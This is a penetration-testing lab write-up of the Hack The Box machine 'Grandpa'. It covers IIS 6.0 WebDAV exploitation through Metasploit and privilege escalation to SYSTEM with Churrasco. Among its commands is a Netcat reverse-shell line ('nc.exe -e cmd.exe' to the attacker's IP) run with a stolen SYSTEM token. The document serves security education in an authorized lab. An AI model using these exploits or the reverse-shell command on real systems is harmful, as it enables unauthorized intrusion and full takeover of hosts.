# Hack The Box — Grandpa

> **Platform:** Hack The Box  
> **Machine:** Grandpa  
> **Difficulty:** Easy  
> **Operating System:** Windows  
> **Assessment Type:** Black-Box  
> **Objective:** Obtain user and SYSTEM access by identifying and exploiting vulnerabilities in Microsoft IIS 6.0 WebDAV and performing local privilege escalation.

---

# Overview

Grandpa is one of Hack The Box's classic Windows machines that demonstrates the importance of identifying legacy services and understanding how multiple stages of an attack fit together.

Unlike machines where exploitation immediately results in SYSTEM privileges, Grandpa requires a complete offensive workflow consisting of reconnaissance, exploitation, local enumeration, privilege escalation, and post-exploitation.

The assessment began by identifying the exposed services, validating the target's software versions, exploiting a vulnerable IIS WebDAV service to gain an initial foothold, and finally escalating privileges to **NT AUTHORITY\SYSTEM** through a local privilege escalation vulnerability.

This machine reinforces an important lesson:

> Initial access is only the beginning. Successful engagements depend just as much on post-exploitation and privilege escalation as they do on exploitation itself.

---

# Attack Path

```
Reconnaissance
      │
      ▼
Service Enumeration
      │
      ▼
IIS 6.0 Fingerprinting
      │
      ▼
Vulnerability Research
      │
      ▼
WebDAV Exploitation
      │
      ▼
Meterpreter Session
      │
      ▼
Local Enumeration
      │
      ▼
Privilege Escalation Research
      │
      ▼
Churrasco Token Impersonation
      │
      ▼
SYSTEM Access
```

---

# Initial Reconnaissance

As with every assessment, the first objective was to understand the externally exposed attack surface.

A standard Nmap scan was performed using service detection together with the default NSE scripts.

```bash
nmap -sC -sV -oN nmap_scan 10.129.95.233
```

### Scan Result

> 📷 **Screenshot**

![Nmap Scan](Images/nmap.png)

The scan revealed only two accessible services.

| Port | Service | Version |
|-------|----------|----------|
|80|HTTP|Microsoft IIS 6.0|
|135|MSRPC|Microsoft Windows RPC|

Although the attack surface appeared small, one service immediately stood out.

The web server was running **Microsoft IIS 6.0**, a legacy version that has been affected by several publicly disclosed vulnerabilities throughout its lifetime.

Because outdated web services often present the highest probability of remote compromise, IIS became the primary focus of the assessment.

---

# Web Enumeration

After identifying the web server, I opened the application in the browser to understand what it was hosting.

> 📷 **Screenshot**

![Web Server](Images/webserver.png)

The server responded with the default IIS landing page.

While this page did not expose any sensitive functionality, it confirmed several useful observations.

- Microsoft IIS 6.0
- Default website configuration
- WebDAV functionality enabled

The presence of WebDAV immediately suggested investigating publicly available vulnerabilities targeting IIS 6.0.

---

# Vulnerability Research

Rather than immediately attempting exploitation, I first validated whether known public vulnerabilities existed for the detected IIS version.

Using Searchsploit:

```bash
searchsploit IIS 6.0
```

> 📷 **Screenshot**

![Searchsploit IIS](Images/searchsploit.png)

Several public exploits were returned.

Among them, one vulnerability attracted immediate attention.

```
Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl Overflow
```

To better understand the available exploit options, I mirrored the exploit locally.

```bash
searchsploit -m 41738.py
```

> 📷 **Screenshot**

![Mirror Exploit](Images/searchsploit-mirrot.png)

Reviewing exploit code before execution is a valuable habit during offensive assessments.

Rather than blindly running public exploits, understanding how they interact with the target helps validate assumptions and reduces unnecessary risk.

---

# Selecting an Exploitation Method

Although the Python proof-of-concept was available, Metasploit provides a stable implementation of the same WebDAV vulnerability together with automatic payload generation and session management.

To determine whether the module was available, I searched Metasploit.

```text
search iis
```

> 📷 **Screenshot**

![Metasploit Search](Images/msf-search.png)

The framework included the **Microsoft IIS WebDAV ScStoragePathFromUrl Overflow** exploit module.

Using the maintained Metasploit module simplified payload generation while preserving the same attack path.

---

# Initial Access

After loading the exploit module, I configured the required parameters.

```text
set RHOSTS 10.129.95.233
set LHOST <VPN-IP>
```

Once the payload options had been configured, the exploit was executed.

> 📷 **Screenshot**

![Exploit](Images/msf-exploit.png)

The exploit completed successfully and established a Meterpreter session against the target.

At this stage, remote code execution had been achieved under the privileges assigned to the compromised IIS worker process.

Obtaining an initial shell, however, was only the first objective.

The next step was to determine the current privilege level and identify an appropriate path to SYSTEM.

---

# Verifying the Current Context

To understand the level of access obtained through the IIS exploit, I migrated into a stable process and verified the execution context.

```text
getuid
```

The session confirmed that commands were executing under the **NETWORK SERVICE** account.

Although this account provides limited access to the operating system, it does not possess administrative privileges.

A local privilege escalation would therefore be required before the assessment could be considered complete.

---

# Local Enumeration

Before attempting privilege escalation, I gathered additional information about the compromised host to better understand the operating environment.

Basic system information was collected to identify the Windows version, installed patches, and running services.

```cmd
sysinfo
```

Listing the contents of the current directory also helped identify accessible files and confirm the working location of the compromised process.

> 📷 **Screenshot**

![Directory Listing](Images/dir.png)

Since manual enumeration can overlook potential privilege escalation vectors, I decided to use Metasploit's **Local Exploit Suggester** module.

This module compares the target's operating system, architecture, and installed patches against a database of known local privilege escalation vulnerabilities.

---

# Identifying a Privilege Escalation Path

After backgrounding the Meterpreter session, I executed the Local Exploit Suggester module.

> 📷 **Screenshot**

![Local Exploit Suggester](Images/local-exploit-suggester.png)

Several potential privilege escalation techniques were identified.

Rather than attempting every available exploit, I selected **Churrasco**, a well-known token impersonation exploit suitable for older versions of Windows running services under the **NETWORK SERVICE** account.

Choosing a privilege escalation technique should always be based on the current execution context rather than simply selecting the first available exploit.

---

# Researching the Exploit

Before executing the exploit, I reviewed the original Churrasco project to understand how it worked and verify the expected behavior.

> 📷 **Screenshot**

![Churrasco GitHub](Images/churrasco.png)

Churrasco exploits a weakness in the Windows Secondary Logon service that allows a lower-privileged service account to impersonate a privileged token and execute arbitrary commands as **NT AUTHORITY\SYSTEM**.

Since the current shell was running as **NETWORK SERVICE**, this exploit represented an appropriate privilege escalation technique.

---

# Preparing the Privilege Escalation

Unlike Meterpreter's built-in privilege escalation modules, Churrasco requires a command to execute once SYSTEM privileges have been obtained.

To convert the elevated execution into an interactive shell, I chose to upload a Windows build of Netcat.

First, a Netcat listener was started on the attacking machine.

```bash
nc -lvnp 4445
```

> 📷 **Screenshot**

![Netcat Listener](Images/nc-gh.png)

Next, the Netcat binary was uploaded to the compromised host.

> 📷 **Screenshot**

![Upload Netcat](Images/nc-uploaded.png)

After confirming the transfer, the Churrasco executable was uploaded using Meterpreter.

> 📷 **Screenshot**

![Upload Churrasco](Images/churrasco-uploaded.png)

With both binaries successfully transferred, everything was in place for the privilege escalation.

---

# Privilege Escalation

Churrasco was instructed to execute Netcat using the stolen SYSTEM token.

```cmd
churrasco.exe -d "C:\Windows\Temp\nc.exe -e cmd.exe <VPN-IP> 4445"
```

> 📷 **Screenshot**

![Running Churrasco](Images/churrasco-ran.png)

A few seconds later, the waiting Netcat listener received a new connection.

> 📷 **Screenshot**

![SYSTEM Shell](Images/nc-success.png)

To verify the privilege level, I executed:

```cmd
whoami
```

The output confirmed:

```
nt authority\system
```

At this stage, full administrative control of the operating system had been achieved.

---

# User Enumeration

With unrestricted access to the system, I navigated through the user profiles to locate the user flag.

The Desktop directory contained the expected flag file.

> 📷 **Screenshot**

![User Flag](Images/usr-flag.png)

Reading the contents of `user.txt` confirmed successful user-level compromise.

---

# SYSTEM Verification

Finally, I navigated to the Administrator profile.

The Administrator Desktop contained the root flag.

> 📷 **Screenshot**

![Root Flag](Images/root-flag.png)

Successfully reading `root.txt` confirmed complete compromise of the target and marked the end of the assessment.

---

# Findings

| Finding | Severity |
|----------|----------|
|Microsoft IIS 6.0 WebDAV Remote Code Execution|Critical|
|Legacy Windows Server Operating System|High|
|Token Impersonation Privilege Escalation|High|
|Outdated Web Server Components|High|

---

# Lessons Learned

Grandpa demonstrates that successful penetration tests rarely end after obtaining an initial shell.

Several important lessons emerged during this assessment:

- Legacy web services continue to present valuable attack surfaces when exposed to the internet.
- Public exploit databases are useful for validating potential attack vectors before exploitation.
- Initial access should always be followed by systematic local enumeration.
- Privilege escalation requires understanding the current execution context and selecting an appropriate technique rather than relying on trial and error.
- Reviewing public exploit source code before execution provides valuable insight into the underlying vulnerability and expected behavior.
- A complete assessment includes exploitation, privilege escalation, validation, and thorough documentation of the attack path.

---

# Tools Used

- Nmap
- Metasploit Framework
- Searchsploit
- Meterpreter
- Netcat
- Churrasco
- Windows Command Prompt

---

# References

- Microsoft IIS 6.0 WebDAV
- CVE-2017-7269
- Churrasco Token Impersonation Exploit
- Exploit-DB
- Hack The Box — Grandpa

---

> **Disclaimer**
>
> This walkthrough documents an assessment performed exclusively within the authorized Hack The Box laboratory environment. It is intended for educational purposes and to demonstrate penetration testing methodology in a controlled environment.
